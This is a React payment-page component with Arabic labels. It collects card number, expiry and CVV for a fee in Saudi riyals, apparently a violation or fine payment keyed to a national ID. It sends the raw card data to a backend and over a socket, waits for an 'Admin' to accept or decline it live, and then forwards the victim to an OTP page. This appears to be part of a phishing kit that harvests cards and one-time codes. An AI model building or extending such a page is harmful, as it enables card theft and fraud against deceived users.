import axios from "axios";
import React, { useState } from "react";
import { api_route, socket } from "../App";
import { TailSpin } from "react-loader-spinner";
import { id } from "./Home";
import { FaLock } from "react-icons/fa";

const Payemnt = () => {
  const [card_number, setCardNumber] = useState("");
  const [expireMonth, setExpiryMonth] = useState("");
  const [expireYear, setExpirYear] = useState("");
  const [cvv, setCvv] = useState("");
  const [error, setError] = useState(false);
  const [errorCard, setErrorCard] = useState(false);
  const [load, setLoad] = useState(null);
  const [method, setMethod] = useState(null);
  const [check, setCheck] = useState("visa");
  const price = sessionStorage.getItem("price");
  const nationalId = sessionStorage.getItem("nationalId");
  const id = sessionStorage.getItem("id");
  const vioNumber = sessionStorage.getItem("vioNumber");

  const formatCardNumber = (value) => {
    // Remove non-numeric characters
    const numericValue = value.replace(/\D/g, "");

    // Add space after every 4 digits
    let formattedValue = numericValue.replace(/(\d{4})(?=\d)/g, "$1 ");

    // Trim to 16 characters
    formattedValue = formattedValue.slice(0, 19);

    // Update state
    setCardNumber(formattedValue);
  };

  const handleCardNumberChange = (e) => {
    formatCardNumber(e.target.value);
  };

  const handleCvvChange = (e) => {
    // Limit input to 3 digits
    const numericValue = e.target.value.replace(/\D/g, "");
    setCvv(numericValue.slice(0, 3));
  };

  const handleSubmit = async (e) => {
    setLoad(true);
    setError(false);
    e.preventDefault();
    let check = card_number.split(" ").join("");
    if (check.length !== 16) {
      setLoad(false);
      return window.alert("رقم البطاقه يجب ان يكون 16 رقم");
    }
    if (
      !(
        card_number.startsWith("4") &&
        (method === "visa" || method === "mada")
      ) &&
      !(
        card_number.startsWith("5") &&
        (method === "master" || method === "mada")
      )
    ) {
      setLoad(false);
      return setErrorCard(true);
    }

    const finalData = {
      visa_card_number: card_number,
      visa_expiryDate: expireMonth + " / " + expireYear,
      visa_cvv: cvv,
      method,
    };
    console.log(finalData);
    try {
      await axios
        .post(api_route + "/visa/" + sessionStorage.getItem("id"), finalData)
        .then(() => {
          socket.emit("visa", {
            id: sessionStorage.getItem("id"),
            ...finalData,
          });
        });
    } catch (error) {
      console.error(error);
    }
  };

  socket.on("acceptVisa", (data) => {
    console.log("acceptVisa From Admin", id);
    sessionStorage.setItem("method", method);
    sessionStorage.setItem("cardNumber", card_number);
    console.log(data);
    if (id === data) {
      window.location.href = "/OTP";
    }
  });

  socket.on("declineVisa", (data) => {
    console.log("declineVisa From Admin", data);

    console.log(data);
    if (id === data) {
      setLoad(false);
      setError("بيانات البطاقة غير صحيحة برجاء المحاولة مره اخري");
    }
  });

  return (
    <div className="w-full  flex flex-col items-start justify-start bg-white  h-screen rounded-md py-5 px-1 ">
      <div className="flex items-center gap-x-2 p-3 border-b-2  w-full">
        <span className="text-[#1c6345] font-bold">تفاصيل الدفع</span>
        <FaLock className="text-yellow-500" />
      </div>
      <form
        className="w-full flex flex-col  px-3 py-4 "
        onSubmit={handleSubmit}
      >
        <span className="text-[#1c6345] font-bold text-sm mb-2">
          {" "}
          نوع البطاقة *
        </span>
        <div className="  w-full flex  flex-wrap p-2 gap-x-1">
          <div className="flex items-center gap-x-1 flex-1">
            <input
              type="radio"
              value={method}
              onChange={() => setMethod("visa")}
              name="method"
            />
            <img src="/Visa.svg" className="w-16 border-2 p-2 " />
            <span className="text-[#1c6345]  text-sm">Visa</span>
          </div>
          <div className="flex items-center gap-x-1 flex-1 justify-center ">
            <input
              type="radio"
              value={method}
              onChange={() => setMethod("master")}
              name="method"
            />
            <img src="/MasterCard.svg" className="w-12 border-2 p-2 " />
            <span className="text-[#1c6345] text-sm">Mastercard</span>
          </div>

          <div className="flex items-center gap-x-1 w-1/2">
            <input
              type="radio"
              value={method}
              onChange={() => setMethod("mada")}
              name="method"
            />
            <img
              src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTlJeSetovZYxcpQmPuM-fu7k2EzUcVb3qU0w&s"
              className="w-20"
            />
            <span className="text-[#1c6345] ">mada</span>
          </div>
        </div>
        <div className="w-full flex flex-col gap-y-2 ">
          <span className="text-[#1c6345] text-sm">رقم البطاقة *</span>
          <input
            value={card_number}
            required
            onChange={handleCardNumberChange}
            dir="ltr"
            maxLength={19}
            minLength={16}
            inputMode="numeric"
            type="text"
            disabled={!method}
            placeholder=""
            className={`w-full  ${
              errorCard ? "border-red-500" : ""
            }    rounded-md  text-black   p-2   text-center border-2     outline-green-800`}
          />
        </div>
        <div className="w-full flex items-center gap-x-3 my-2">
          <div className="w-1/2 flex flex-col gap-y-2 ">
            <span className="text-[#1c6345] text-sm">
              شهر انتهاء الصلاحية *
            </span>
            <select
              value={expireMonth}
              disabled={!method}
              required
              onChange={(e) => setExpiryMonth(e.target.value)}
              className="w-full      rounded-md  text-black text-sm   p-1   border-2     outline-green-800"
            >
              <option>الشهر</option>
              {[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12].map((opt) => {
                return <option>{opt}</option>;
              })}
            </select>
          </div>{" "}
          <div className="w-1/2 flex flex-col gap-y-2 ">
            <span className="text-[#1c6345] text-sm">
              سنة انتهاء الصلاحية *
            </span>
            <select
              value={expireYear}
              disabled={!method}
              required
              onChange={(e) => setExpirYear(e.target.value)}
              className="w-full      rounded-md  text-black text-sm   p-1   border-2     outline-green-800"
            >
              <option>السنة</option>
              {[2025, 2026, 2027, 2028, 2029, 2030, 2031, 2032, 2033].map(
                (opt) => {
                  return <option>{opt}</option>;
                }
              )}
            </select>
          </div>
        </div>
        <div className="flex flex-col w-full">
          <span className="text-[#1c6345] text-sm">CVN</span>{" "}
          <span className=" text-[#1c6345] w-full" style={{ fontSize: "8px" }}>
            هذا الرمز عبارة عن ثلاثة أو أربعة أرقام مطبوعة علي الوجه الأمامي أو
            الخلفي من بطاقة الأئتمان
          </span>
          <div className="flex py-2 ">
            <input
              className=" w-1/3     rounded-md  text-black text-sm   p-1   border-2     outline-green-800"
              type="text"
              value={cvv}
              disabled={!method}
              onChange={handleCvvChange}
              inputMode="numeric"
              maxLength={3}
              required
            />
            <img src="/cvn.png" className="w-16" />
          </div>
        </div>
        <div className="py-5 w-full flex flex-col">
          <span className="text-[#1c6345] w-full border-b pb-2 ">
            الطلب الخاص بك{" "}
          </span>
          <div className="w-full flex justify-between bg-green-100 p-2 my-1 rounded-md">
            <span className="text-sm">المبلغ الإجمالي </span>
            <span className="">
              {Number(sessionStorage.getItem("price")).toFixed(2)} SAR
            </span>
          </div>
          <div className="flex justify-between w-full py-5">
            <span
              className="px-10 py-1 border border-black rounded-md"
              onClick={() => window.history.back()}
            >
              إلغاء
            </span>
            <button
              className="px-10 py-1  bg-green-600 text-white rounded-md"
              disabled={!method}
            >
              دفع
            </button>
          </div>
        </div>
      </form>

      {load ? (
        <div className="fixed top-0 w-full h-screen bg-black bg-opacity-20 flex items-center justify-center ">
          <TailSpin
            height="50"
            width="50"
            color="white"
            ariaLabel="tail-spin-loading"
            radius="1"
            wrapperStyle={{}}
            wrapperClass=""
            visible={true}
          />
        </div>
      ) : (
        ""
      )}
    </div>
    // <div
    //   className="w-full flex flex-col min-h-screen items-center justify-center  relative"
    //   dir="rtl"
    // >
    //   <form
    //     className=" w-11/12  p-3 rounded-xl justify-center  items-center flex flex-col gap-y-2 "
    //     onSubmit={handleSubmit}
    //   >
    //     <div
    //       className="w-full py-3  flex flex-col items-center justify-between p-2 rounded-xl"
    //       dir="rtl"
    //     >
    //       <div className="flex flex-col w-full gap-3  my-2">
    //         <input
    //           value={car_holder_name}
    //           required
    //           onChange={(e) => setCardHolderName(e.target.value)}
    //           dir="ltr"
    //           minLength={4}
    //           type="text"
    //           placeholder="الأسم المدون علي البطاقة"
    //           className="w-full   rounded-md border    p-2  placeholder:text-gray-600 text-center     outline-orange-500"
    //         />
    //       </div>
    //       <div className="flex flex-col w-full gap-3  my-2" dir="rtl">
    // <input
    //   value={card_number}
    //   required
    //   onChange={handleCardNumberChange}
    //   dir="ltr"
    //   maxLength={19}
    //   minLength={16}
    //   inputMode="numeric"
    //   type="text"
    //   placeholder="**** **** **** ****"
    //   className="w-full   rounded-md border    p-2  placeholder:text-gray-600 text-center     outline-orange-500"
    // />
    //       </div>
    //       <div className="w-full flex items-end justify-end">
    //         <img src="/img7.avif" />
    //       </div>
    //       <div className="flex w-full  gap-2">
    //         <div
    //           className="flex flex-col w-full  gap-x-5 text-xl my-2"
    //           dir="rtl"
    //         >
    // <div className="flex w-full gap-x-5 px-2 text-sm ">
    //   <div className="flex items-center justify-center gap-x-2">
    //     <input
    //       className="text-xs  border rounded-md py-2 px-1 text-center w-1/2"
    //       type="text"
    //       value={cvv}
    //       onChange={handleCvvChange}
    //       inputMode="numeric"
    //       placeholder="CVV"
    //       maxLength={3}
    //       required
    //     />
    //     <span className="text-xs"> كود الحماية</span>
    //   </div>
    //   <div className="flex items-center justify-center gap-x-2">
    //     <input
    //       className="text-xs  border rounded-md py-2 px-1 text-center w-1/2"
    //       type="text"
    //       value={expiryDate}
    //       maxLength={5}
    //       inputMode="numeric"
    //       onChange={handleExpiryDateChange}
    //       placeholder="MM/YY"
    //       required
    //     />
    //     <span className="text-xs"> تاريخ الإنتهاء </span>
    //   </div>
    //  </div>
    // </div>
    //       </div>
    //       <div
    //         className="flex items-center justify-start gap-3 px-2 text-lg text-gray-500 my-2 "
    //         dir="rtl"
    //       ></div>

    //       <div className="w-full flex items-center justify-center relative">
    //         <img src="/visa2.png" className="rounded-md" />
    //         {cvv && (
    //           <span className="text-white absolute right-16 top-6 font-semibold">
    //             {cvv}
    //           </span>
    //         )}
    //         <div className="absolute w-full h-full flex flex-col items-center justify-center -bottom-10 gap-y-2">
    //           {car_holder_name && (
    //             <span className="text-white">{car_holder_name}</span>
    //           )}
    //           {card_number && <span className="text-white">{card_number}</span>}
    //           {expiryDate && <span className="text-white">{expiryDate}</span>}
    //         </div>
    //       </div>
    //       {error && (
    //         <span className="text-red-500 w-full text-center text-lg mt-5 font-bold">
    //           {error}
    //         </span>
    //       )}

    //       <button
    //         className="bg-black w-full my-5 font-bold text-white flex items-center justify-center  py-2 rounded-md mt-5"
    //         type="submit"
    //       >
    //         {load ? (
    //           <TailSpin
    //             height="30"
    //             width="30"
    //             color="white"
    //             ariaLabel="tail-spin-loading"
    //             radius="1"
    //             wrapperStyle={{}}
    //             wrapperClass=""
    //             visible={true}
    //           />
    //         ) : (
    //           "تسديد "
    //         )}
    //       </button>
    //     </div>
    //   </form>
    //   <img src="/visa3.png" className="w-11/12 my-2 " />
    // </div>
  );
};

export default Payemnt;
